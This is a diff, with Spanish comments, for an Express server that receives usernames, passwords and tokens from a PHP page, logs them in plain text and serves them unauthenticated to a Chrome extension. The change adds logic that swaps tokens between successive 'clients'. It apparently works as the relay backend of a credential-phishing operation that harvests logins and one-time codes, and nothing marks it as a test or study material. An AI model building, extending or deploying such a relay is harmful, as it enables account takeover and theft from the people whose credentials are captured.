@@ -5,7 +5,7 @@ const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// 🚩 VARIABLE GLOBAL: Aquí se guardará el último dato en la nube
+// 🚩 VARIABLE GLOBAL
 let baseDeDatosTemporal = {
     user: null,
     pass: null,
@@ -17,19 +17,31 @@ let baseDeDatosTemporal = {
 // 1. RUTA PARA RECIBIR (La que usa tu PHP en XAMPP)
 app.post('/recibir', (req, res) => {
     const { user, pass, token, origen } = req.body;
+
+    // --- LÓGICA DE LIMPIEZA ANT-REPETICIÓN ---
+    // Si llega un usuario nuevo, o el origen indica que es un inicio, 
+    // matamos el token anterior para que no se use con el nuevo cliente.
+    let tokenFinal = token;
     
+    if (user && user !== baseDeDatosTemporal.user) {
+        console.log("⚠️ Detectado nuevo usuario. Reseteando token viejo...");
+        tokenFinal = token || null; // Si no mandas token nuevo, queda en null
+    } else {
+        // Si es el mismo usuario, mantenemos el token que ya teníamos a menos que llegue uno nuevo
+        tokenFinal = token || baseDeDatosTemporal.token;
+    }
+
     // Guardamos en la "agenda" para la extensión
     baseDeDatosTemporal = {
-        user: user || baseDeDatosTemporal.user, // Mantiene el usuario si solo llega el token
+        user: user || baseDeDatosTemporal.user,
         pass: pass || baseDeDatosTemporal.pass,
-        token: token || baseDeDatosTemporal.token,
+        token: tokenFinal, 
         origen: origen,
         actualizado: true
     };
 
-    // Seguimos mostrando en los Logs de Render para que tú lo veas
     console.log("===============================");
-    console.log("🔔 DATO GUARDADO PARA EXTENSIÓN");
+    console.log("🔔 DATO ACTUALIZADO");
     console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
     console.log(`🔑 Clave: ${baseDeDatosTemporal.pass}`);
     console.log(`📲 Token: ${baseDeDatosTemporal.token}`);
@@ -40,14 +52,9 @@ app.post('/recibir', (req, res) => {
 
 // 2. RUTA PARA CONSULTAR (La que usará la Extensión de Chrome)
 app.get('/consultar', (req, res) => {
-    // Le entregamos a la extensión lo que tenemos guardado
     res.json(baseDeDatosTemporal);
-    
-    // Opcional: una vez que la extensión lo lee, podrías marcarlo como 'visto'
-    // baseDeDatosTemporal.actualizado = false; 
 });
 
-// Ruta simple de chequeo
 app.get('/', (req, res) => {
     res.send("Servidor de Logs y API de Extensión Activo");
 });
